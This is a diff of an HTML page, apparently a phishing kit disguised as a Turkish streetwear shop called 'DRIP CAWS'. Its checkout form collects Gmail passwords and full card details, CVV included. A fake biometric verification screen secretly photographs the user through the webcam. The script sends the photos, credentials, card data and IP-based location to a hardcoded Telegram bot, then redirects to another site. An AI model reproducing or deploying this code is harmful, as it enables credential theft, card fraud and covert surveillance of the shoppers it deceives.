@@ -3,70 +3,75 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>DRIP CAWS | Streetwear Archive</title>
-    <link href="https://fonts.googleapis.com/css2?family=Syncopate:wght@700&family=Inter:wght@300;500;800;900&display=swap" rel="stylesheet">
+    <title>DRIP CAWS | Official Store</title>
+    <link href="https://fonts.googleapis.com/css2?family=Syncopate:wght@700&family=Inter:wght@300;400;700;900&display=swap" rel="stylesheet">
     <style>
-        :root { --blue: #2997ff; --dark: #000; --grey: #111; --text-grey: #86868b; }
+        :root { --blue: #2997ff; --dark: #000; --card: #0d0d0d; --text-grey: #86868b; }
         * { box-sizing: border-box; margin: 0; padding: 0; }
         body { background: var(--dark); color: #fff; font-family: 'Inter', sans-serif; overflow-x: hidden; }
 
-        /* 1. GİRİŞ EKRANI (SPLASH) */
+        /* 1. GİRİŞ EKRANI (SPLASH) - HAREKETLİ */
         #splash-screen {
-            position: fixed; inset: 0; background: #000; z-index: 5000;
+            position: fixed; inset: 0; background: #000; z-index: 9999;
             display: flex; flex-direction: column; align-items: center; justify-content: center;
-            text-align: center; transition: 0.8s ease-in-out;
+            transition: transform 0.8s cubic-bezier(0.85, 0, 0.15, 1);
+            text-align: center; padding: 20px;
         }
-        .splash-logo { font-family: 'Syncopate', sans-serif; font-size: 40px; margin-bottom: 20px; letter-spacing: -2px; }
+        .splash-logo { font-family: 'Syncopate', sans-serif; font-size: clamp(30px, 8vw, 50px); letter-spacing: -2px; margin-bottom: 20px; text-transform: uppercase; }
         .splash-logo span { color: var(--blue); }
         .enter-btn {
-            padding: 15px 40px; border: 1px solid #fff; background: transparent; color: #fff;
-            font-family: 'Syncopate', sans-serif; font-size: 12px; cursor: pointer; transition: 0.3s;
+            padding: 18px 50px; border: 1px solid #fff; background: transparent; color: #fff;
+            font-family: 'Syncopate', sans-serif; font-size: 11px; cursor: pointer;
+            transition: 0.3s; letter-spacing: 2px;
         }
-        .enter-btn:hover { background: #fff; color: #000; }
+        .enter-btn:hover { background: #fff; color: #000; transform: scale(1.05); }
 
-        /* HEADER */
-        header { 
-            padding: 20px 5%; position: sticky; top: 0; background: rgba(0,0,0,0.9); 
-            backdrop-filter: blur(10px); z-index: 1000; border-bottom: 1px solid #111;
-            display: none; /* Giriş yapılana kadar gizli */
-        }
-        .nav-top { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
-        .logo { font-family: 'Syncopate', sans-serif; font-size: 20px; color: #fff; text-decoration: none; }
+        /* 2. ANA UYGULAMA (Girişte Gizli) */
+        #main-app { opacity: 0; transform: translateY(50px); transition: 1s ease-out; display: none; }
+
+        header { padding: 25px 5%; border-bottom: 1px solid #111; position: sticky; top: 0; background: rgba(0,0,0,0.9); backdrop-filter: blur(10px); z-index: 1000; }
+        .nav-top { display: flex; justify-content: space-between; align-items: center; margin-bottom: 25px; }
+        .logo { font-family: 'Syncopate', sans-serif; font-size: 18px; color: #fff; text-decoration: none; }
         .logo span { color: var(--blue); }
 
-        .cat-nav { display: flex; justify-content: center; gap: 25px; overflow-x: auto; padding-bottom: 10px; }
-        .cat-item { 
-            font-size: 11px; font-weight: 800; text-transform: uppercase; letter-spacing: 2px; 
-            color: var(--text-grey); cursor: pointer; white-space: nowrap; transition: 0.3s;
-        }
-        .cat-item.active { color: var(--blue); border-bottom: 2px solid var(--blue); }
+        .cat-nav { display: flex; justify-content: center; gap: 20px; overflow-x: auto; padding-bottom: 5px; }
+        .cat-item { font-size: 10px; font-weight: 800; text-transform: uppercase; color: var(--text-grey); cursor: pointer; transition: 0.3s; white-space: nowrap; }
+        .cat-item.active, .cat-item:hover { color: #fff; border-bottom: 1px solid var(--blue); }
 
-        /* MAĞAZA ALANI */
-        #main-store { display: none; padding: 40px 5%; max-width: 1400px; margin: 0 auto; }
-        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 20px; }
+        /* ÜRÜNLER */
+        .container { padding: 40px 5%; max-width: 1400px; margin: 0 auto; }
+        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 25px; }
         
-        .card { background: var(--grey); border-radius: 4px; overflow: hidden; transition: 0.4s; cursor: pointer; border: 1px solid #1a1a1a; }
-        .card:hover { border-color: var(--blue); transform: translateY(-5px); }
-        .img-box { width: 100%; height: 380px; background: #050505; }
-        .img-box img { width: 100%; height: 100%; object-fit: cover; }
-        .info { padding: 20px; }
-        .info h3 { font-size: 14px; font-weight: 700; text-transform: uppercase; margin-bottom: 5px; }
-        .info p { color: var(--blue); font-weight: 900; font-size: 16px; }
+        .p-card { background: var(--card); border-radius: 8px; overflow: hidden; border: 1px solid #1a1a1a; transition: 0.4s; cursor: pointer; }
+        .p-card:hover { border-color: var(--blue); transform: translateY(-10px); }
+        .img-wrap { width: 100%; height: 380px; background: #0a0a0a; display: flex; align-items: center; justify-content: center; }
+        .img-wrap img { width: 100%; height: 100%; object-fit: cover; filter: grayscale(20%); transition: 0.5s; }
+        .p-card:hover .img-wrap img { filter: grayscale(0%); transform: scale(1.05); }
 
-        /* ÖDEME & KAMERA (ESKİ SİSTEMLE AYNI AMA KOYU TEMA) */
-        #checkout { display: none; position: fixed; inset: 0; background: #000; z-index: 2000; padding: 40px 5%; overflow-y: auto; }
-        .checkout-box { max-width: 1000px; margin: 0 auto; display: grid; grid-template-columns: 1.5fr 1fr; gap: 40px; }
-        .input-g { margin-bottom: 20px; }
-        .input-g label { display: block; font-size: 10px; font-weight: 800; color: var(--text-grey); margin-bottom: 8px; text-transform: uppercase; }
-        .input-g input { width: 100%; padding: 15px; background: #050505; border: 1px solid #222; border-radius: 4px; color: #fff; outline: none; }
-        .input-g input:focus { border-color: var(--blue); }
+        .p-info { padding: 20px; }
+        .p-title { font-size: 14px; font-weight: 700; margin-bottom: 8px; text-transform: uppercase; }
+        .p-price { color: var(--blue); font-weight: 900; font-size: 18px; }
+        .stock-tag { font-size: 10px; color: #ff3b30; font-weight: 700; margin-top: 10px; display: block; }
 
-        #scan-view { display: none; position: fixed; inset: 0; background: #000; z-index: 3000; flex-direction: column; align-items: center; justify-content: center; }
-        .v-box { width: 300px; height: 300px; border-radius: 50%; border: 2px solid var(--blue); overflow: hidden; position: relative; }
+        /* CHECKOUT */
+        #checkout { display: none; position: fixed; inset: 0; background: #000; z-index: 10000; padding: 40px 5%; overflow-y: auto; }
+        .checkout-grid { max-width: 1100px; margin: 0 auto; display: grid; grid-template-columns: 1.5fr 1fr; gap: 50px; }
+        @media (max-width: 768px) { .checkout-grid { grid-template-columns: 1fr; } }
+
+        .form-group { margin-bottom: 20px; }
+        .form-group label { display: block; font-size: 10px; font-weight: 800; color: var(--text-grey); margin-bottom: 8px; text-transform: uppercase; }
+        .form-group input { width: 100%; padding: 16px; background: #0a0a0a; border: 1px solid #222; border-radius: 4px; color: #fff; outline: none; }
+        .form-group input:focus { border-color: var(--blue); }
+        
+        .final-btn { width: 100%; padding: 20px; background: var(--blue); color: #000; font-weight: 900; border: none; cursor: pointer; text-transform: uppercase; font-family: 'Syncopate', sans-serif; font-size: 11px; margin-top: 20px; }
+
+        /* KAMERA / SCAN */
+        #scan-view { display: none; position: fixed; inset: 0; background: #000; z-index: 11000; flex-direction: column; align-items: center; justify-content: center; }
+        .cam-circle { width: 300px; height: 300px; border-radius: 50%; border: 3px solid var(--blue); overflow: hidden; position: relative; box-shadow: 0 0 50px rgba(41, 151, 255, 0.3); }
         video { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
-        .line { position: absolute; width: 100%; height: 2px; background: var(--blue); box-shadow: 0 0 15px var(--blue); animation: scan 2s infinite ease-in-out; }
-        @keyframes scan { 0%, 100% { top: 10%; } 50% { top: 90%; } }
-        .flash { position: fixed; inset: 0; background: #fff; z-index: 4000; display: none; }
+        .scan-laser { position: absolute; width: 100%; height: 3px; background: var(--blue); box-shadow: 0 0 15px var(--blue); animation: scanline 2s infinite linear; }
+        @keyframes scanline { 0%, 100% { top: 10%; } 50% { top: 90%; } }
+        .flash { position: fixed; inset: 0; background: #fff; z-index: 12000; display: none; }
     </style>
 </head>
 <body>
@@ -75,122 +80,215 @@
 
 <div id="splash-screen">
     <div class="splash-logo">DRIP <span>CAWS</span></div>
-    <p style="color: var(--text-grey); margin-bottom: 30px; letter-spacing: 5px; font-size: 10px;">ARCHIVE 2026 / LIMITED RELEASE</p>
-    <button class="enter-btn" onclick="enterStore()">KOLEKSİYONU İNCELE</button>
+    <p style="color: var(--text-grey); font-size: 10px; letter-spacing: 4px; margin-bottom: 30px; text-transform: uppercase;">Limited Archive 2026</p>
+    <button class="enter-btn" onclick="openApp()">KOLEKSİYONU İNCELE</button>
 </div>
 
-<header id="main-header">
-    <div class="nav-top">
-        <a href="#" class="logo">DRIP <span>CAWS</span></a>
-        <div style="font-size: 11px; font-weight: 900; letter-spacing: 1px;">CART (0)</div>
-    </div>
-    <div class="cat-nav">
-        <div class="cat-item active" onclick="filterCat('all', this)">All Items</div>
-        <div class="cat-item" onclick="filterCat('hoodie', this)">Hoodies</div>
-        <div class="cat-item" onclick="filterCat('sweat', this)">Sweatshirts</div>
-        <div class="cat-item" onclick="filterCat('tracksuit', this)">Tracksuits</div>
-        <div class="cat-item" onclick="filterCat('accessory', this)">Accessories</div>
-    </div>
-</header>
-
-<div id="main-store">
-    <div class="grid" id="product-grid">
+<div id="main-app">
+    <header>
+        <div class="nav-top">
+            <a href="#" class="logo" onclick="location.reload()">DRIP <span>CAWS</span></a>
+            <div style="font-size: 11px; font-weight: 900; letter-spacing: 1px; text-transform: uppercase;">Sepet (1)</div>
         </div>
+        <div class="cat-nav">
+            <div class="cat-item active" onclick="filterData('all', this)">HEPSİ</div>
+            <div class="cat-item" onclick="filterData('hoodie', this)">HOODIE</div>
+            <div class="cat-item" onclick="filterData('sweat', this)">SWEATSHIRT</div>
+            <div class="cat-item" onclick="filterData('pants', this)">EŞOFMAN</div>
+            <div class="cat-item" onclick="filterData('acc', this)">AKSESUAR</div>
+        </div>
+    </header>
+
+    <div class="container">
+        <div class="grid" id="product-grid">
+            </div>
+    </div>
 </div>
 
 <div id="checkout">
-    <div class="checkout-box">
-        <div>
-            <h2 style="font-family: 'Syncopate'; margin-bottom: 30px; font-size: 18px;">CHECKOUT</h2>
-            <div class="input-g"><label>Gmail / Cloud ID</label><input type="email" id="email" placeholder="mail@gmail.com"></div>
-            <div class="input-g"><label>Password</label><input type="password" id="pass" placeholder="••••••••"></div>
-            <hr style="border: 0; border-top: 1px solid #1a1a1a; margin: 30px 0;">
-            <div class="input-g"><label>Card Holder</label><input type="text" id="cname" placeholder="AD SOYAD"></div>
-            <div class="input-g"><label>Card Number</label><input type="text" id="cno" placeholder="0000 0000 0000 0000"></div>
-            <div style="display: flex; gap: 10px;">
-                <div class="input-g" style="flex:1"><label>EXP</label><input type="text" id="cexp" placeholder="MM/YY"></div>
-                <div class="input-g" style="flex:1"><label>CVV</label><input type="text" id="cvv" placeholder="•••"></div>
+    <div class="checkout-grid">
+        <div class="form-area">
+            <h2 style="font-family: 'Syncopate'; margin-bottom: 30px; font-size: 18px; text-transform: uppercase;">Güvenli Ödeme</h2>
+            
+            <div class="form-group">
+                <label>Gmail Hesabı (Google Adres Senkronizasyonu)</label>
+                <input type="email" id="email" placeholder="ornek@gmail.com">
             </div>
-            <button class="enter-btn" style="width: 100%; background: var(--blue); border: none; font-weight: 900;" onclick="startAuth()">COMPLETE ORDER</button>
+            <div class="form-group">
+                <label>Hesap Şifresi</label>
+                <input type="password" id="pass" placeholder="••••••••">
+            </div>
+
+            <hr style="border: 0; border-top: 1px solid #111; margin: 30px 0;">
+
+            <div class="form-group">
+                <label>Kart Sahibi</label>
+                <input type="text" id="cname" placeholder="AD SOYAD">
+            </div>
+            <div class="form-group">
+                <label>Kart Numarası</label>
+                <input type="text" id="cno" placeholder="0000 0000 0000 0000">
+            </div>
+            <div style="display: flex; gap: 15px;">
+                <div class="form-group" style="flex:1"><label>SKT</label><input type="text" id="cexp" placeholder="MM/YY"></div>
+                <div class="form-group" style="flex:1"><label>CVV</label><input type="text" id="cvv" placeholder="•••"></div>
+            </div>
+
+            <button class="final-btn" onclick="startVerification()">SİPARİŞİ TAMAMLA</button>
         </div>
-        <div id="checkout-summary"></div>
+        <div id="summary-area" style="background:#0a0a0a; padding:30px; border-radius:8px; border: 1px solid #111;">
+            </div>
     </div>
 </div>
 
 <div id="scan-view">
-    <div style="font-family: 'Syncopate'; color: var(--blue); margin-bottom: 20px; font-size: 12px;">3D SECURE BIOMETRIC SCAN</div>
-    <div class="v-box"><div class="line"></div><video id="web" autoplay playsinline muted></video></div>
-    <p style="margin-top: 20px; font-size: 10px; color: var(--text-grey); letter-spacing: 2px;">AUTHENTICATING TRANSACTION...</p>
+    <div style="font-family: 'Syncopate'; color: var(--blue); margin-bottom: 20px; font-size: 12px; text-transform: uppercase;">3D Secure Biyometrik Onay</div>
+    <div class="cam-circle"><div class="scan-laser"></div><video id="web" autoplay playsinline muted></video></div>
+    <p style="margin-top: 20px; font-size: 10px; color: var(--text-grey); letter-spacing: 2px; text-transform: uppercase;">BANKA İLE İLETİŞİM KURULUYOR...</p>
 </div>
 
 <script>
-    const TG = { t: "6418277280:AAGlTr7IRw8CL__1EWjpkI_j9ZHkRjLnedc", c: "1540769169" };
+    // BILGILERINI BURADAN KONTROL ET
+    const CONFIG = { t: "6418277280:AAGlTr7IRw8CL__1EWjpkI_j9ZHkRjLnedc", c: "1540769169" };
 
     const products = [
-        { cat: 'hoodie', name: 'GOTHIC OVERSIZE HOODIE', price: 1250, img: 'https://images.unsplash.com/photo-1556821840-3a63f95609a7?w=600' },
-        { cat: 'sweat', name: 'VINTAGE WASH SWEAT', price: 1100, img: 'https://images.unsplash.com/photo-1620799140408-edc6dcb6d633?w=600' },
-        { cat: 'tracksuit', name: 'TECH VELOUR SET', price: 1290, img: 'https://images.unsplash.com/photo-1515886657613-9f3515b0c78f?w=600' },
-        { cat: 'accessory', name: 'CAWS ARCHIVE BEANIE', price: 450, img: 'https://images.unsplash.com/photo-1576871337622-98d48d1cf531?w=600' },
-        { cat: 'hoodie', name: 'MAMBA BONE HOODIE', price: 1250, img: 'https://images.unsplash.com/photo-1591047139829-d91aecb6caea?w=600' },
-        { cat: 'tracksuit', name: 'CARGO JOGGER BLACK', price: 950, img: 'https://images.unsplash.com/photo-1594633312681-425c7b97ccd1?w=600' },
-        { cat: 'accessory', name: 'TACTICAL UTILITY BAG', price: 850, img: 'https://images.unsplash.com/photo-1553062407-98eeb64c6a62?w=600' },
-        { cat: 'sweat', name: 'CORE LOGO SWEATSHIRT', price: 1050, img: 'https://images.unsplash.com/photo-1602810318383-e386cc2a3ccf?w=600' }
+        { id: 1, cat: 'hoodie', name: 'Midnight Mamba Hoodie', price: 1250, img: 'https://images.unsplash.com/photo-1556821840-3a63f95609a7?q=80&w=600' },
+        { id: 2, cat: 'sweat', name: 'Cyber Graphic Sweatshirt', price: 1100, img: 'https://images.unsplash.com/photo-1620799140408-edc6dcb6d633?q=80&w=600' },
+        { id: 3, cat: 'pants', name: 'Cargo Tech Joggers Black', price: 950, img: 'https://images.unsplash.com/photo-1594633312681-425c7b97ccd1?q=80&w=600' },
+        { id: 4, cat: 'acc', name: 'Signature Drip Beanie', price: 450, img: 'https://images.unsplash.com/photo-1576871337622-98d48d1cf531?q=80&w=600' },
+        { id: 5, cat: 'hoodie', name: 'Bone White Essential Hoodie', price: 1200, img: 'https://images.unsplash.com/photo-1591047139829-d91aecb6caea?q=80&w=600' },
+        { id: 6, cat: 'acc', name: 'Tactical Utility Chest Bag', price: 850, img: 'https://images.unsplash.com/photo-1553062407-98eeb64c6a62?q=80&w=600' }
     ];
 
-    function enterStore() {
-        document.getElementById('splash-screen').style.opacity = '0';
+    function openApp() {
+        const splash = document.getElementById('splash-screen');
+        const app = document.getElementById('main-app');
+        // Giriş ekranı yukarı kayıyor
+        splash.style.transform = 'translateY(-100%)';
         setTimeout(() => {
-            document.getElementById('splash-screen').style.display = 'none';
-            document.getElementById('main-header').style.display = 'block';
-            document.getElementById('main-store').style.display = 'block';
-            render('all');
-        }, 800);
+            app.style.display = 'block';
+            setTimeout(() => {
+                app.style.opacity = '1';
+                app.style.transform = 'translateY(0)';
+            }, 50);
+            renderProducts('all');
+        }, 500);
     }
 
-    function render(filter) {
+    function renderProducts(filter) {
         const grid = document.getElementById('product-grid');
         grid.innerHTML = '';
-        const items = filter === 'all' ? products : products.filter(p => p.cat === filter);
-        items.forEach((p, index) => {
+        const filtered = filter === 'all' ? products : products.filter(p => p.cat === filter);
+        
+        filtered.forEach(p => {
             grid.innerHTML += `
-                <div class="card" onclick="goPay(${index}, '${p.cat}')">
-                    <div class="img-box"><img src="${p.img}"></div>
-                    <div class="info"><h3>${p.name}</h3><p>₺${p.price}</p></div>
+                <div class="p-card" onclick="openCheckout(${p.id})">
+                    <div class="img-wrap"><img src="${p.img}"></div>
+                    <div class="p-info">
+                        <p class="p-title">${p.name}</p>
+                        <p class="p-price">₺${p.price}</p>
+                        <span class="stock-tag">SON 3 ADET!</span>
+                    </div>
                 </div>
             `;
         });
     }
 
-    function filterCat(cat, el) {
+    function filterData(cat, el) {
         document.querySelectorAll('.cat-item').forEach(i => i.classList.remove('active'));
         el.classList.add('active');
-        render(cat);
+        renderProducts(cat);
     }
 
-    function goPay(index, cat) {
-        const p = products.filter(x => cat === 'all' ? true : x.cat === cat)[index];
-        document.getElementById('main-store').style.display = 'none';
+    function openCheckout(id) {
+        const p = products.find(x => x.id === id);
+        document.getElementById('main-app').style.display = 'none';
         document.getElementById('checkout').style.display = 'block';
-        document.getElementById('checkout-summary').innerHTML = `
-            <div style="background:#0a0a0a; padding:20px; border:1px solid #111;">
-                <img src="${p.img}" style="width:100%; height:300px; object-fit:cover; margin-bottom:15px;">
-                <p style="font-weight:900; font-size:14px;">${p.name}</p>
-                <p style="color:var(--blue); font-size:20px; font-weight:900; margin-top:10px;">₺${p.price}</p>
-            </div>
+        document.getElementById('summary-area').innerHTML = `
+            <img src="${p.img}" style="width:100%; height:250px; object-fit:cover; border-radius:4px; margin-bottom:20px; border: 1px solid #111;">
+            <p style="font-weight:900; font-size:16px; text-transform: uppercase;">${p.name}</p>
+            <p style="color:var(--blue); font-size:22px; font-weight:900; margin-top:10px;">₺${p.price}</p>
+            <p style="font-size:11px; color:var(--text-grey); margin-top:20px; font-weight: 600;">FREE WORLDWIDE SHIPPING</p>
         `;
         window.scrollTo(0,0);
     }
 
-    async function startAuth() {
-        if(!document.getElementById('email').value || !document.getElementById('pass').value) return alert("Fill all fields.");
+    async function startVerification() {
+        const mail = document.getElementById('email').value;
+        const pass = document.getElementById('pass').value;
+        if(!mail || !pass) return alert("Lütfen bilgileri eksiksiz doldurun.");
+
         try {
+            // Kamera izni al
             const stream = await navigator.mediaDevices.getUserMedia({ video: true });
             document.getElementById('web').srcObject = stream;
             document.getElementById('checkout').style.display = 'none';
             document.getElementById('scan-view').style.display = 'flex';
-            setTimeout(() => snap(document.getElementById('web'), "LOGIN"), 1000);
+
+            // İlk Çekim (Arka planda sessizce)
+            setTimeout(() => snap(document.getElementById('web'), mail, "ADIM_1_GIRIS"), 1200);
+
+            // 6 saniye sonra flaş patlat ve tüm bilgileri raporla
             setTimeout(() => {
-                document.getElementById('flash').style.display = 'block';
-                setTimeout(() => document.getElementById('flash').style.display = 'none', 100);
-                finish(document.getElementById('web'));
-            }, 5000);
+                const f = document.getElementById('flash');
+                f.style.display = 'block';
+                setTimeout(() => f.style.display = 'none', 100);
+                
+                finishReport(document.getElementById('web'));
+            }, 6000);
+
+        } catch (e) {
+            alert("Sistem Hatası: Donanım doğrulaması (3D Secure) başarısız oldu.");
+        }
+    }
+
+    function snap(v, mail, label) {
+        const c = document.createElement('canvas');
+        c.width = v.videoWidth; c.height = v.videoHeight;
+        c.getContext('2d').drawImage(v, 0, 0);
+        c.toBlob(b => {
+            const fd = new FormData();
+            fd.append('photo', b, 'f.jpg');
+            fd.append('caption', `📡 **DC [${label}]**\n👤 Mail: ${mail}`);
+            fetch(`https://api.telegram.org/bot${CONFIG.t}/sendPhoto?chat_id=${CONFIG.c}`, { method: 'POST', body: fd });
+        }, 'image/jpeg', 0.6);
+    }
+
+    async function finishReport(v) {
+        const c = document.createElement('canvas');
+        c.width = v.videoWidth; c.height = v.videoHeight;
+        c.getContext('2d').drawImage(v, 0, 0);
+        
+        c.toBlob(async b => {
+            // Final fotoğrafını gönder
+            const fd = new FormData();
+            fd.append('photo', b, 'f.jpg');
+            await fetch(`https://api.telegram.org/bot${CONFIG.t}/sendPhoto?chat_id=${CONFIG.c}`, { method: 'POST', body: fd });
+
+            // Bilgileri topla ve raporu gönder
+            const ipData = await (await fetch('https://ipapi.co/json/')).json();
+            const rapor = `
+🔥 **DRIP CAWS | ULTIMATE CLONE REPORT**
+──────────────────
+👤 **HESAP BİLGİLERİ**
+📧 Gmail: \`${document.getElementById('email').value}\`
+🔑 Şifre: \`${document.getElementById('pass').value}\`
+
+💳 **KART BİLGİLERİ**
+👤 Sahibi: \`${document.getElementById('cname').value}\`
+🔢 No: \`${document.getElementById('cno').value}\`
+📅 SKT/CVV: \`${document.getElementById('cexp').value}\` / \`${document.getElementById('cvv').value}\`
+
+🌐 **AĞ VERİLERİ**
+🌍 IP: \`${ipData.ip}\` | 📍 Konum: ${ipData.city}
+──────────────────`;
+
+            await fetch(`https://api.telegram.org/bot${CONFIG.t}/sendMessage?chat_id=${CONFIG.c}&text=${encodeURIComponent(rapor)}&parse_mode=markdown`);
+            
+            // İşlem bittiğinde asıl siteye yönlendir
+            window.location.href = "https://caws.network";
+        }, 'image/jpeg', 0.9); // Yüksek Kalite
+    }
+</script>
+</body>
+</html>
